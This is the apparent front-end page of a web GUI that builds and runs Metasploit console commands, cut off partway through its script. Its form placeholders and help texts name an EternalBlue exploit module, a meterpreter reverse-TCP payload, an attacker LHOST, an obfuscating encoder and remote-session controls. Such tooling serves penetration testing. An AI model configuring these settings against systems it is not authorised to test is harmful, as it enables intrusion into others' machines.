<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Metasploit Web GUI</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Lucide Icons CDN -->
    <script src="https://unpkg.com/lucide@latest"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #1a202c; /* Dark background */
            color: #e2e8f0; /* Light text */
        }
        .tab-button.active {
            background-color: #9B59B6; /* Amethyst Purple */
            color: black;
            font-weight: bold;
        }
        .tab-content {
            display: none;
        }
        .tab-content.active {
            display: block;
        }
        /* Custom scrollbar for output area */
        .custom-scrollbar::-webkit-scrollbar {
            width: 12px;
            height: 12px;
        }
        .custom-scrollbar::-webkit-scrollbar-track {
            background: #2C3E50; /* Dark Blue/Grey */
            border-radius: 10px;
        }
        .custom-scrollbar::-webkit-scrollbar-thumb {
            background-color: #9B59B6; /* Amethyst Purple */
            border-radius: 10px;
            border: 3px solid #2C3E50;
        }
        .custom-scrollbar::-webkit-scrollbar-corner {
            background: #2C3E50;
        }

        /* Specific colors for Metasploit output (adapted from Nmap theme) */
        .output-green { color: #2ECC71; } /* Emerald Green */
        .output-red { color: #E74C3C; }   /* Alizarin Red */
        .output-blue { color: #8E44AD; }  /* Wisteria Purple */
        .output-orange { color: #F39C12; } /* Orange */
        .output-default { color: #ECF0F1; } /* Light Grey */
        .highlight { background-color: yellow; color: black; }

        /* Help popup styling */
        .help-popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #2C3E50; /* Dark Blue/Grey */
            border-radius: 0.5rem;
            box-shadow: 0 10px 15px rgba(0, 0, 0, 0.5);
            z-index: 1000;
            padding: 1.5rem;
            width: 90%;
            max-width: 500px;
            max-height: 80vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            border: 1px solid #9B59B6; /* Add a border for better visibility */
        }
        .help-popup-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            z-index: 999;
        }

        /* Modal styles (from original index.html, adapted for new theme) */
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0,0,0,0.8); /* Dark modal background */
            align-items: center;
            justify-content: center;
        }
        .modal-content {
            background-color: #1a202c; /* Modal background */
            margin: auto;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
            width: 90%;
            max-width: 700px;
            max-height: 90vh;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            border: 1px solid #9B59B6; /* Purple border for modal */
        }
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding-bottom: 10px;
            border-bottom: 1px solid #9B59B6;
            margin-bottom: 15px;
        }
        .modal-header h2 {
            @apply text-xl font-semibold text-purple-400; /* Purple modal title */
        }
        .modal-close {
            @apply text-gray-400 hover:text-purple-400 text-2xl font-bold;
            cursor: pointer;
        }
        .modal-body {
            flex-grow: 1;
            overflow-y: auto;
            @apply text-gray-300;
        }
        .modal-footer {
            padding-top: 15px;
            border-top: 1px solid #9B59B6;
            margin-top: 15px;
            text-align: right;
        }

        /* Input field styling */
        input[type="text"], input[type="number"], select, textarea {
            @apply bg-gray-600 text-white rounded-md border border-gray-500 shadow-sm focus:border-purple-500 focus:ring focus:ring-purple-500 focus:ring-opacity-50 p-2;
        }
        input[type="checkbox"] {
            @apply form-checkbox h-5 w-5 text-purple-600 rounded bg-gray-600 border-gray-500;
        }

        /* Button styling */
        .btn-primary {
            @apply px-4 py-2 bg-purple-600 text-white rounded-md hover:bg-purple-700 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:ring-opacity-50 flex items-center justify-center transition-colors duration-200;
        }
        .btn-secondary {
            @apply px-4 py-2 bg-gray-700 text-gray-200 rounded-md hover:bg-gray-600 focus:outline-none focus:ring-2 focus:ring-gray-500 focus:ring-opacity-50 flex items-center justify-center transition-colors duration-200;
        }
        .btn-success {
            @apply px-6 py-3 bg-green-600 text-white rounded-lg text-lg font-semibold hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-opacity-50 flex items-center transition-colors duration-200 transform hover:scale-105;
        }
        .btn-danger {
            @apply px-6 py-3 bg-red-600 text-white rounded-lg text-lg font-semibold hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-opacity-50 flex items-center transition-colors duration-200 transform hover:scale-105;
        }
        .btn-info {
            @apply px-6 py-3 bg-indigo-600 text-white rounded-lg text-lg font-semibold hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-opacity-50 flex items-center transition-colors duration-200 transform hover:scale-105;
        }
    </style>
</head>
<body class="p-4 min-h-screen flex flex-col items-center">
    <div class="bg-gray-800 p-6 rounded-lg shadow-xl w-full max-w-6xl mb-6">
        <div class="flex items-center justify-between mb-6">
            <h1 class="text-3xl font-bold text-purple-400">Metasploit Web GUI</h1>
            <div class="flex space-x-2">
                <button id="install_msf_linux_button" class="btn-primary">
                    <i data-lucide="download" class="w-5 h-5 mr-2"></i> Install MSF (Linux)
                </button>
                <button id="install_msf_termux_button" class="btn-primary">
                    <i data-lucide="download" class="w-5 h-5 mr-2"></i> Install MSF (Termux)
                </button>
                <button id="download_msf_windows_button" class="btn-primary">
                    <i data-lucide="download" class="w-5 h-5 mr-2"></i> Download MSF (Windows)
                </button>
            </div>
        </div>

        <!-- Tabs Navigation -->
        <div class="flex flex-wrap justify-center bg-gray-700 rounded-t-lg p-2 mb-4">
            <button class="tab-button px-4 py-2 rounded-md text-sm font-medium transition-colors duration-200 hover:bg-purple-600 active" data-tab="module-selection">Module Selection</button>
            <button class="tab-button px-4 py-2 rounded-md text-sm font-medium transition-colors duration-200 hover:bg-purple-600" data-tab="global-options">Global Options</button>
            <button class="tab-button px-4 py-2 rounded-md text-sm font-medium transition-colors duration-200 hover:bg-purple-600" data-tab="module-options">Module Options</button>
            <button class="tab-button px-4 py-2 rounded-md text-sm font-medium transition-colors duration-200 hover:bg-purple-600" data-tab="actions">Actions</button>
            <button class="tab-button px-4 py-2 rounded-md text-sm font-medium transition-colors duration-200 hover:bg-purple-600" data-tab="sessions">Sessions</button>
            <button class="tab-button px-4 py-2 rounded-md text-sm font-medium transition-colors duration-200 hover:bg-purple-600" data-tab="advanced">Advanced</button>
            <button class="tab-button px-4 py-2 rounded-md text-sm font-medium transition-colors duration-200 hover:bg-purple-600" data-tab="examples">Examples</button>
        </div>

        <!-- Tab Content -->
        <div id="tab-content-container" class="bg-gray-700 p-4 rounded-b-lg mb-4 max-h-[500px] overflow-y-auto custom-scrollbar">
            <!-- Module Selection Tab -->
            <div id="module-selection" class="tab-content active">
                <h2 class="text-xl font-semibold text-purple-300 mb-4">Module Selection</h2>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div class="flex items-center">
                        <label for="module_type_select" class="w-48 text-right pr-4">Module Type:</label>
                        <select id="module_type_select" name="module_type_select" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onchange="generateCommand()">
                            <option value="">(None)</option>
                            <option value="exploit">Exploit</option>
                            <option value="payload">Payload</option>
                            <option value="auxiliary">Auxiliary</option>
                            <option value="post">Post</option>
                            <option value="encoder">Encoder</option>
                            <option value="nops">Nops</option>
                        </select>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Select the type of Metasploit module to use (e.g., exploit, auxiliary).')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="module_name_entry" class="w-48 text-right pr-4">Module Name:</label>
                        <input type="text" id="module_name_entry" name="module_name_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" placeholder="e.g., windows/smb/ms17_010_eternalblue" onkeyup="generateCommand()">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Enter the full path to the module (e.g., exploit/windows/smb/ms17_010_eternalblue). If only module name is provided, it will perform a search.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <button class="btn-primary w-full" onclick="searchModule()">
                            <i data-lucide="search" class="w-5 h-5 mr-2"></i> Search Module
                        </button>
                    </div>
                </div>
            </div>

            <!-- Global Options Tab -->
            <div id="global-options" class="tab-content">
                <h2 class="text-xl font-semibold text-purple-300 mb-4">Global Options (setg)</h2>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div class="flex items-center">
                        <label for="lhost_entry" class="w-48 text-right pr-4">LHOST:</label>
                        <input type="text" id="lhost_entry" name="lhost_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" placeholder="e.g., 192.168.1.10" onkeyup="generateCommand()">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Local host IP address for reverse connections (e.g., your attacker IP).')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="lport_entry" class="w-48 text-right pr-4">LPORT:</label>
                        <input type="number" id="lport_entry" name="lport_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" placeholder="e.g., 4444" onkeyup="generateCommand()">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Local port for reverse connections.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="rhost_entry" class="w-48 text-right pr-4">RHOSTS:</label>
                        <input type="text" id="rhost_entry" name="rhost_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" placeholder="e.g., 192.168.1.100" onkeyup="generateCommand()">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Remote host IP address(es) or range (target).')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="rport_entry" class="w-48 text-right pr-4">RPORT:</label>
                        <input type="number" id="rport_entry" name="rport_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" placeholder="e.g., 445" onkeyup="generateCommand()">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Remote port (target port).')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="payload_entry" class="w-48 text-right pr-4">PAYLOAD:</label>
                        <input type="text" id="payload_entry" name="payload_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" placeholder="e.g., windows/meterpreter/reverse_tcp" onkeyup="generateCommand()">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('The payload to use with the exploit module.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="encoder_entry" class="w-48 text-right pr-4">ENCODER:</label>
                        <input type="text" id="encoder_entry" name="encoder_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" placeholder="e.g., x86/shikata_ga_nai" onkeyup="generateCommand()">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('The encoder to use for obfuscation.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="nops_entry" class="w-48 text-right pr-4">NOP:</label>
                        <input type="text" id="nops_entry" name="nops_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" placeholder="e.g., x86/opty2" onkeyup="generateCommand()">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('The NOP generator to use.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="platform_entry" class="w-48 text-right pr-4">PLATFORM:</label>
                        <input type="text" id="platform_entry" name="platform_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" placeholder="e.g., windows" onkeyup="generateCommand()">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('The target platform (e.g., windows, linux).')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="arch_entry" class="w-48 text-right pr-4">ARCH:</label>
                        <input type="text" id="arch_entry" name="arch_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" placeholder="e.g., x86" onkeyup="generateCommand()">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('The target architecture (e.g., x86, x64).')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="exit_func_entry" class="w-48 text-right pr-4">ExitFunction:</label>
                        <input type="text" id="exit_func_entry" name="exit_func_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" placeholder="e.g., thread" onkeyup="generateCommand()">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('The method to exit the payload (e.g., thread, process, seh).')">?</button>
                    </div>
                    <div class="flex items-center">
                        <input type="checkbox" id="disable_payload_handler_var" name="disable_payload_handler_var" class="form-checkbox h-5 w-5 text-purple-600 rounded bg-gray-600 border-gray-500" onchange="generateCommand()">
                        <label for="disable_payload_handler_var" class="ml-2">DisablePayloadHandler</label>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Disable the automatic payload handler (useful when using external handlers).')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="auto_run_script_entry" class="w-48 text-right pr-4">AutoRunScript:</label>
                        <input type="text" id="auto_run_script_entry" name="auto_run_script_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" placeholder="e.g., post/windows/gather/enum_logged_on_users" onkeyup="generateCommand()">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('A script to run automatically after a session is established.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="session_comm_timeout_entry" class="w-48 text-right pr-4">SessionCommunicationTimeout:</label>
                        <input type="number" id="session_comm_timeout_entry" name="session_comm_timeout_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" placeholder="e.g., 300" onkeyup="generateCommand()">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Timeout in seconds for session communication.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="session_exp_timeout_entry" class="w-48 text-right pr-4">SessionExpirationTimeout:</label>
                        <input type="number" id="session_exp_timeout_entry" name="session_exp_timeout_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" placeholder="e.g., 600" onkeyup="generateCommand()">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Timeout in seconds before a session expires.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="reverse_listener_bind_addr_entry" class="w-48 text-right pr-4">ReverseListenerBindAddress:</label>
                        <input type="text" id="reverse_listener_bind_addr_entry" name="reverse_listener_bind_addr_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" placeholder="e.g., 0.0.0.0" onkeyup="generateCommand()">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('The address to bind the reverse listener to.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="reverse_listener_bind_port_entry" class="w-48 text-right pr-4">ReverseListenerBindPort:</label>
                        <input type="number" id="reverse_listener_bind_port_entry" name="reverse_listener_bind_port_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" placeholder="e.g., 4444" onkeyup="generateCommand()">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('The port to bind the reverse listener to.')">?</button>
                    </div>
                </div>
            </div>

            <!-- Module Options Tab -->
            <div id="module-options" class="tab-content">
                <h2 class="text-xl font-semibold text-purple-300 mb-4">Module-Specific Options (set)</h2>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div class="flex items-start col-span-2">
                        <label for="custom_options_entry" class="w-48 text-right pr-4 pt-2">Custom Options (one per line):</label>
                        <textarea id="custom_options_entry" name="custom_options_entry" rows="8" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" placeholder="e.g.,
TARGET 0
URIPATH /
SRVPORT 8080" onkeyup="generateCommand()"></textarea>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Enter module-specific options (e.g., TARGET 0, URIPATH /). Each option on a new line. You can also type commands like "show options" or "info" here.')">?</button>
                    </div>
                </div>
            </div>

            <!-- Actions Tab -->
            <div id="actions" class="tab-content">
                <h2 class="text-xl font-semibold text-purple-300 mb-4">Actions</h2>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div class="flex items-center">
                        <input type="radio" id="show_options_var" name="action_radio" class="form-radio h-5 w-5 text-purple-600 rounded bg-gray-600 border-gray-500" onchange="generateCommand()">
                        <label for="show_options_var" class="ml-2">Show Options</label>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Display all options for the currently selected module.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <input type="radio" id="show_payloads_var" name="action_radio" class="form-radio h-5 w-5 text-purple-600 rounded bg-gray-600 border-gray-500" onchange="generateCommand()">
                        <label for="show_payloads_var" class="ml-2">Show Payloads</label>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('List available payloads for the current exploit module.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <input type="radio" id="show_targets_var" name="action_radio" class="form-radio h-5 w-5 text-purple-600 rounded bg-gray-600 border-gray-500" onchange="generateCommand()">
                        <label for="show_targets_var" class="ml-2">Show Targets</label>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('List available targets for the current exploit module.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <input type="radio" id="run_exploit_var" name="action_radio" class="form-radio h-5 w-5 text-purple-600 rounded bg-gray-600 border-gray-500" onchange="generateCommand()">
                        <label for="run_exploit_var" class="ml-2">Run Exploit</label>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Execute the configured exploit module. Runs in background (-j) and does not interact (-z).')">?</button>
                    </div>
                    <div class="flex items-center">
                        <input type="radio" id="check_exploit_var" name="action_radio" class="form-radio h-5 w-5 text-purple-600 rounded bg-gray-600 border-gray-500" onchange="generateCommand()">
                        <label for="check_exploit_var" class="ml-2">Check Exploit</label>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Check if the target is vulnerable without exploiting.')">?</button>
                    </div>
                </div>
            </div>

            <!-- Sessions Tab -->
            <div id="sessions" class="tab-content">
                <h2 class="text-xl font-semibold text-purple-300 mb-4">Session Management</h2>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div class="flex items-center">
                        <input type="radio" id="sessions_list_var" name="action_radio" class="form-radio h-5 w-5 text-purple-600 rounded bg-gray-600 border-gray-500" onchange="generateCommand()">
                        <label for="sessions_list_var" class="ml-2">List Sessions</label>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('List all active Metasploit sessions.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <input type="radio" id="background_session_var" name="action_radio" class="form-radio h-5 w-5 text-purple-600 rounded bg-gray-600 border-gray-500" onchange="generateCommand()">
                        <label for="background_session_var" class="ml-2">Background Current Session</label>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Send the current session to the background.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="interact_session_entry" class="w-48 text-right pr-4">Interact with Session ID:</label>
                        <input type="number" id="interact_session_entry" name="interact_session_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" placeholder="e.g., 1" onkeyup="generateCommand()" onchange="document.getElementById('action_radio_none').checked = true;">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Interact with a specific session by ID (e.g., sessions -i 1). Note: Direct interaction in the web GUI is limited; this will run the command but you won\'t get an interactive shell.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <label for="kill_session_entry" class="w-48 text-right pr-4">Kill Session ID:</label>
                        <input type="number" id="kill_session_entry" name="kill_session_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" placeholder="e.g., 1" onkeyup="generateCommand()" onchange="document.getElementById('action_radio_none').checked = true;">
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Terminate a specific session by ID (e.g., sessions -k 1).')">?</button>
                    </div>
                     <!-- Hidden radio button to allow clearing other radio selections -->
                    <input type="radio" id="action_radio_none" name="action_radio" class="hidden" checked>
                </div>
            </div>

            <!-- Advanced Tab -->
            <div id="advanced" class="tab-content">
                <h2 class="text-xl font-semibold text-purple-300 mb-4">Advanced Options</h2>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div class="flex items-start col-span-2">
                        <label for="additional_args_entry" class="w-48 text-right pr-4 pt-2">Additional Raw Commands:</label>
                        <textarea id="additional_args_entry" name="additional_args_entry" rows="8" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" placeholder="Enter any raw msfconsole commands here, one per line.
e.g.,
show advanced
show missing
setg VERBOSE true" onkeyup="generateCommand()"></textarea>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Enter any other msfconsole commands not covered by the GUI. Each command on a new line. These will be executed sequentially.')">?</button>
                    </div>
                    <div class="flex items-center">
                        <input type="radio" id="exit_msfconsole_var" name="action_radio" class="form-radio h-5 w-5 text-purple-600 rounded bg-gray-600 border-gray-500" onchange="generateCommand()">
                        <label for="exit_msfconsole_var" class="ml-2">Exit msfconsole</label>
                        <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded" onclick="showHelp('Exit the msfconsole after running the commands.')">?</button>
                    </div>
                </div>
            </div>

            <!-- Examples Tab -->
            <div id="examples" class="tab-content">
                <h2 class="text-xl font-semibold text-purple-300 mb-4">Examples</h2>
                <div class="mb-4 flex items-center">
                    <label for="example_search_entry" class="w-32 text-right pr-4">Search Examples:</label>
                    <input type="text" id="example_search_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="filterExamples()">
                    <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-4 py-2 rounded" onclick="clearExampleSearch()">Clear Search</button>
                </div>
                <div id="examples_list" class="grid grid-cols-1 gap-4">
                    <!-- Examples will be loaded here by JavaScript -->
                </div>
            </div>
        </div>

        <!-- Generated Command -->
        <div class="bg-gray-700 p-4 rounded-lg shadow-md mb-4">
            <h2 class="text-xl font-semibold text-purple-300 mb-2">Generated Metasploit Command</h2>
            <textarea id="command_text" class="w-full h-24 p-2 rounded bg-gray-900 text-purple-400 font-mono text-sm resize-none custom-scrollbar" readonly></textarea>
            <div class="flex justify-end mt-2 space-x-2">
                <button class="bg-purple-500 hover:bg-purple-600 text-white px-4 py-2 rounded-md transition-colors duration-200" onclick="copyCommand()">Copy Command</button>
                <button class="bg-purple-500 hover:bg-purple-600 text-white px-4 py-2 rounded-md transition-colors duration-200" onclick="generateCommand()">Generate Command</button>
            </div>
        </div>

        <!-- Action Buttons -->
        <div class="flex justify-center space-x-4 mb-4">
            <button id="run_msfconsole_button" class="btn-success">
                <i data-lucide="play" class="w-6 h-6 mr-2"></i> Run Metasploit
            </button>
            <button class="btn-danger" onclick="clearOutput()">
                <i data-lucide="trash-2" class="w-6 h-6 mr-2"></i> Clear Output
            </button>
            <button class="btn-info" onclick="saveOutput()">
                <i data-lucide="save" class="w-6 h-6 mr-2"></i> Save Output
            </button>
        </div>

        <!-- Status Bar -->
        <div id="status_bar" class="bg-gray-900 text-white text-sm p-2 rounded-md mb-4 text-center">Ready</div>

        <!-- Metasploit Output -->
        <div class="bg-gray-700 p-4 rounded-lg shadow-md">
            <h2 class="text-xl font-semibold text-purple-300 mb-2">Metasploit Output</h2>
            <div class="flex items-center mb-2">
                <label for="search_entry" class="pr-2">Search:</label>
                <input type="text" id="search_entry" class="flex-1 p-2 rounded bg-gray-600 text-white border border-gray-500" onkeyup="searchOutput()">
                <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-4 py-2 rounded" onclick="searchOutput()">Search</button>
                <button class="ml-2 bg-purple-500 hover:bg-purple-600 text-white px-4 py-2 rounded" onclick="clearSearchHighlight()">Clear Search</button>
            </div>
            <pre id="output_text" class="w-full h-96 p-2 rounded bg-gray-900 text-gray-200 font-mono text-sm overflow-auto custom-scrollbar"></pre>
        </div>
    </div>

    <!-- Footer -->
    <div class="text-gray-500 text-sm mt-4">
        Created by khedr0x00
    </div>

    <!-- Global Message/Alert Modal -->
    <div id="messageModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 id="messageModalTitle">Alert</h2>
                <span class="modal-close" onclick="closeMessageModal()">&times;</span>
            </div>
            <div class="modal-body" id="messageModalBody"></div>
            <div class="modal-footer">
                <button onclick="closeMessageModal()" class="btn-primary">OK</button>
            </div>
        </div>
    </div>

    <!-- Confirmation Modal for Linux/Termux Installation -->
    <div id="installConfirmModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 id="installConfirmModalTitle">Confirm Installation</h2>
                <span class="modal-close" onclick="closeInstallConfirmModal()">&times;</span>
            </div>
            <div class="modal-body" id="installConfirmModalBody"></div>
            <div class="modal-footer flex justify-end space-x-4">
                <button onclick="closeInstallConfirmModal()" class="btn-secondary">Cancel</button>
                <button id="confirmInstallButton" class="btn-success">Install Now</button>
            </div>
        </div>
    </div>

    <!-- Example Output Modal -->
    <div id="exampleOutputModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 id="exampleOutputModalTitle">Example Output</h2>
                <span class="modal-close" onclick="closeExampleOutputModal()">&times;</span>
            </div>
            <div class="modal-body">
                <pre id="exampleOutputModalText" class="w-full h-auto p-2 rounded bg-gray-900 text-gray-200 font-mono text-sm overflow-auto custom-scrollbar"></pre>
            </div>
            <div class="modal-footer">
                <button onclick="closeExampleOutputModal()" class="btn-primary">Close</button>
            </div>
        </div>
    </div>

    <script>
        // Initialize Lucide icons
        lucide.createIcons();

        // Global variable to store examples
        let allExamples = [];
        let currentProcessId = null; // Renamed from currentScanId
        let pollInterval = null;
        let searchStartIndex = 0; // For incremental search in output
        let currentOutputBuffer = ""; // Buffer to accumulate real-time output

        // Function to show/hide tabs
        function showTab(tabId) {
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelectorAll('.tab-button').forEach(button => {
                button.classList.remove('active');
            });
            document.querySelector(`.tab-button[data-tab="${tabId}"]`).classList.add('active');
            document.getElementById(tabId).classList.add('active');
            generateCommand(); // Regenerate command on tab change
        }

        // Event listeners for tab buttons
        document.querySelectorAll('.tab-button').forEach(button => {
            button.addEventListener('click', () => {
                showTab(button.dataset.tab);
            });
        });

        // --- Helper for showing custom modals ---
        function showMessageModal(title, message, isHtml = false) {
            document.getElementById('messageModalTitle').innerText = title;
            const messageBody = document.getElementById('messageModalBody');
            if (isHtml) {
                messageBody.innerHTML = message;
            } else {
                messageBody.innerText = message;
            }
            document.getElementById('messageModal').style.display = 'flex';
        }

        function closeMessageModal() {
            document.getElementById('messageModal').style.display = 'none';
        }

        function showInstallConfirmModal(title, message, onConfirm) {
            document.getElementById('installConfirmModalTitle').innerText = title;
            document.getElementById('installConfirmModalBody').innerHTML = message;
            const confirmButton = document.getElementById('confirmInstallButton');
            confirmButton.onclick = () => {
                closeInstallConfirmModal();
                onConfirm();
            };
            document.getElementById('installConfirmModal').style.display = 'flex';
        }

        function closeInstallConfirmModal() {
            document.getElementById('installConfirmModal').style.display = 'none';
        }

        function showExampleOutputModal(title, output) {
            document.getElementById('exampleOutputModalTitle').innerText = title;
            const outputPre = document.getElementById('exampleOutputModalText');
            outputPre.innerHTML = ''; // Clear previous content

            // Apply coloring based on Metasploit-like output
            insertColoredText(outputPre, output);
            document.getElementById('exampleOutputModal').style.display = 'flex';
        }

        function closeExampleOutputModal() {
            document.getElementById('exampleOutputModal').style.display = 'none';
        }


        // Function to collect form data
        function getFormData() {
            const formData = {};
            document.querySelectorAll('#tab-content-container input, #tab-content-container select, #tab-content-container textarea').forEach(element => {
                if (element.type === 'checkbox' || element.type === 'radio') {
                    formData[element.id] = element.checked;
                } else if (element.type === 'number') {
                    formData[element.id] = element.value ? parseFloat(element.value) : '';
                }
                else {
                    formData[element.id] = element.value;
                }
            });
            return formData;
        }

        // Function to generate msfconsole command
        async function generateCommand() {
            const formData = getFormData();
            try {
                const response = await fetch('/generate_command', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(formData),
                });
                const data = await response.json();
                document.getElementById('command_text').value = data.command;
            } catch (error) {
                console.error('Error generating command:', error);
                document.getElementById('command_text').value = 'Error generating command.';
            }
        }

        // Function to copy command to clipboard
        function copyCommand() {
            const commandText = document.getElementById('command_text');
            commandText.select();
            document.execCommand('copy');
            showMessageModal('Command Copied', 'The command has been copied to your clipboard!');
        }

        // Function to run msfconsole
        async function runMsfconsole() {
            if (currentProcessId) {
